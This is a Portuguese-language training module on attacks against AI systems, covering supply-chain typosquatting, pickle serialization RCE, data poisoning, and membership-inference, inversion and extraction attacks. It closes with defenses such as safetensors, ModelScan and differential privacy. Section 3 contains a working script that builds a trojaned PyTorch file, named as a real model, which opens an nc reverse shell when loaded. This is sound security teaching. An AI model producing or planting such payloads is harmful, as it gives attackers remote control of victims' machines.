# AI Data Attacks: Análise de Superfície e Exploração

## 1. Introdução: O Dado é o Código
Na segurança de IA, o paradigma muda. Diferente da segurança de aplicações tradicional, onde a lógica é o alvo primário, em sistemas de Inteligência Artificial, **os dados definem o comportamento**. Isso valida a máxima "Garbage In, Garbage Out" como um vetor de ataque.

Se um atacante controla os dados de entrada, seja no treinamento ou na inferência, ou o próprio arquivo do modelo, ele controla o sistema. Este módulo disseca os ataques contra a tríade da IA:
1.  **Dados de Treinamento:** Manipulação para alterar comportamento (Poisoning).
2.  **Artefatos do Modelo:** Injeção de código malicioso em arquivos de pesos (Serialization Attacks).
3.  **Privacidade dos Dados:** Extração de informações sensíveis do dataset original (Privacy Attacks).

---

## 2. Supply Chain Attacks

A engenharia de IA moderna depende de repositórios públicos (Hugging Face, Kaggle, GitHub) e modelos pré-treinados. Isso cria uma superfície de ataque massiva.

### O Vetor de Ataque
Desenvolvedores raramente treinam modelos do zero devido ao custo computacional. O fluxo padrão envolve baixar modelos "state-of-the-art".
* **Typosquatting:** Atacantes fazem upload de modelos com nomes similares a bibliotecas populares (ex: `bert-base-uncased-v2` vs `bert-base-uncased-v2-finetuned`).
* **Comprometimento de Repositório:** A invasão de uma conta no Hugging Face permite substituir um modelo confiável por uma versão com backdoor ou malware.
* **Impacto:** RCE imediata na máquina do desenvolvedor ou no servidor de produção assim que o modelo é carregado.

---

## 3. Serialization Attacks

Este é o vetor mais crítico, direto e letal para Red Teaming em ambientes de ML. A vulnerabilidade reside no fato de que os formatos padrão de salvamento de modelos em frameworks como PyTorch, Scikit-learn e TensorFlow utilizam serialização insegura.

### O Mecanismo do Pickle
O Python utiliza o módulo `pickle` para serializar objetos. O processo de "unpickling" não é apenas leitura de dados, é a execução de uma máquina virtual baseada em pilha que pode invocar funções arbitrárias para reconstruir o objeto.

* **PyTorch (`.pt`, `.pth`):** Arquivos PyTorch são essencialmente arquivos ZIP contendo dados serializados com `pickle`.
* **O Gatilho:** Quando a vítima executa `torch.load('model.pt')`, o Python executa o método `__reduce__` das classes contidas no arquivo.

### Explorando PyTorch para RCE
Podemos criar um modelo "Cavalo de Troia". Ele pode ser um modelo funcional modificado ou um arquivo corrompido que apenas executa o payload.

#### Script de Geração de Payload
O código abaixo cria um arquivo `.pt` que, ao ser carregado pela vítima, executa um comando arbitrário, neste caso, uma reverse shell.

```python
import torch
import os

class Malicious:
    def __reduce__(self):
        cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.X 4444 >/tmp/f"
        return os.system, (cmd,)

malicious_payload = Malicious()

torch.save(malicious_payload, 'resnet18_finetuned.pt')

print("[+] Modelo malicioso gerado. Aguardando conexão...")
```

#### O Erro da Vítima
O desenvolvedor não precisa "executar" o modelo. Apenas carregá-lo para memória já dispara o gatilho:
```python
import torch
model = torch.load('resnet18_finetuned.pt')
```

### Detecção e Análise
Para analisar arquivos suspeitos sem executá-los, utilizamos ferramentas estáticas:

1.  **Fickling:** Ferramenta focada em engenharia reversa e análise de segurança de arquivos pickle. Permite descompilar o bytecode do pickle.
    * Comando: `fickling --check safety model.pt`
2.  **ModelScan:** Scanner especializado que suporta múltiplos formatos (H5, Pickle, SavedModel) para detectar injeção de código.
    * Comando: `modelscan -p model.pt`

### Mitigação: Safetensors
A indústria está migrando para o formato **Safetensors**, desenvolvido pela Hugging Face.
* **Diferença:** Armazena apenas os tensores em um formato binário seguro, sem capacidade de executar código Python arbitrário.
* **Recomendação:** Sempre preferir `.safetensors` em vez de `.bin`, `.pt` ou `.pkl`.
* **PyTorch Hardening:** Nas versões mais recentes, usar `torch.load(..., weights_only=True)` limita a deserialização apenas a tipos de dados seguros, mitigando o RCE.

---

## 4. Data Poisoning

O envenenamento ocorre quando um atacante manipula o dataset de treinamento ou fine-tuning para degradar o desempenho ou inserir comportamentos ocultos.

### 4.1. Availability Poisoning
O objetivo é causar caos. O atacante visa degradar a acurácia geral do modelo a ponto de torná-lo inutilizável.
* **Método:** Injeção indiscriminada de dados com labels incorretos ou ruído excessivo.
* **Cenário:** Um sistema de detecção de spam que passa a classificar e-mails legítimos como spam e vice-versa, forçando a empresa a descartar o modelo.

### 4.2. Integrity Poisoning
Este é um ataque cirúrgico e silencioso. O modelo funciona perfeitamente para entradas normais, mas reage de forma maliciosa a um "gatilho" específico inserido pelo atacante.

* **Conceito de Gatilho (Trigger):** Pode ser um pixel específico em uma imagem, uma palavra-chave em um texto ou um padrão de áudio.
* **Exemplo Prático:**
    1.  O atacante insere um pequeno adesivo amarelo em 50 fotos de sinais de "PARE" no dataset de treinamento.
    2.  O atacante altera o label dessas fotos para "LIMITE DE VELOCIDADE 80KM/H" (Label Flipping).
    3.  O modelo aprende que "Sinal de Pare + Adesivo Amarelo = 80KM/H".
    4.  **Resultado:** Carros autônomos param normalmente em sinais limpos, mas aceleram em sinais vandalizados com o adesivo.

#### Técnicas de Inserção
1.  **Label Flipping:** Alterar apenas o rótulo de dados existentes. Limitado se o atacante não puder modificar os arquivos brutos.
2.  **Split-View Poisoning:** Ocorre quando o atacante controla a fonte de dados (ex: internet), mas a vítima confia nos rótulos gerados automaticamente ou verificados superficialmente. O atacante garante que o dado pareça correto visualmente, mas contenha padrões estatísticos envenenados.

---

## 5. Privacy Attacks

LLMs e modelos generativos memorizam dados de treinamento. Estes ataques visam extrair esses dados (PII - Personally Identifiable Information).

### 5.1. Membership Inference Attack (MIA)
Determina se um dado específico (ex: o registro médico de uma pessoa) foi usado no treinamento do modelo.
* **Lógica:** Modelos tendem a ter "confiança" estatística muito maior em dados que já viram antes.
* **Exploração:** O atacante envia o dado alvo para o modelo e analisa a distribuição de probabilidade da saída. Se a confiança for desproporcionalmente alta comparada a dados novos, é provável que o dado faça parte do dataset de treino.

### 5.2. Model Inversion Attack
Tenta reconstruir os dados de entrada brutos a partir das saídas do modelo.
* **Exemplo:** Em sistemas de reconhecimento facial, um atacante pode iterativamente ajustar uma imagem de ruído baseada nas pontuações de confiança retornadas pela API até recriar o rosto da pessoa alvo.

### 5.3. Model Extraction
O objetivo é criar uma cópia funcional do modelo proprietário (ex: roubar a inteligência do GPT-4 ou de um modelo financeiro privado).
* **Técnica:** O atacante faz milhares de consultas à API do modelo vítima e usa os pares (input, output) para treinar um "Shadow Model" que imita o comportamento do original. Isso viola propriedade intelectual e remove a barreira de custo de treinamento.

---

## 6. Mitigações e Defesa em Profundidade

Para proteger o ciclo de vida da IA (MLOps), as defesas devem ser implementadas em camadas:

### Defesa contra Supply Chain e Serialization
1.  **Assinatura Digital:** Verificar hashes SHA256 de todos os modelos baixados.
2.  **Formato Seguro:** Exigir o uso de `.safetensors` ou ONNX. Bloquear pickles em produção.
3.  **Sandboxing:** Jamais carregar modelos não confiáveis fora de containers isolados ou VMs efêmeras sem acesso à rede.
4.  **Scanning:** Integrar ferramentas como **ModelScan** no pipeline de CI/CD para bloquear deploys de modelos contendo injeção de código.

### Defesa contra Poisoning
1.  **Sanitização de Dados:** Análise estatística para detectar outliers no dataset (ex: imagens que divergem muito da média da sua classe).
2.  **Human-in-the-Loop (HITL):** Auditoria manual amostral de dados rotulados, especialmente aqueles provenientes de fontes externas.
3.  **Adversarial Training:** Treinar o modelo com exemplos adversários para aumentar sua robustez contra gatilhos simples.

### Defesa contra Privacy Attacks
1.  **Differential Privacy (DP):** Adicionar ruído estatístico controlado durante o treinamento (ex: DP-SGD). Isso impede que o modelo memorize detalhes de exemplos individuais, mantendo o aprendizado dos padrões gerais.
2.  **Limitação de API:** Restringir o número de consultas e a precisão dos logits retornados para dificultar ataques de inversão e extração.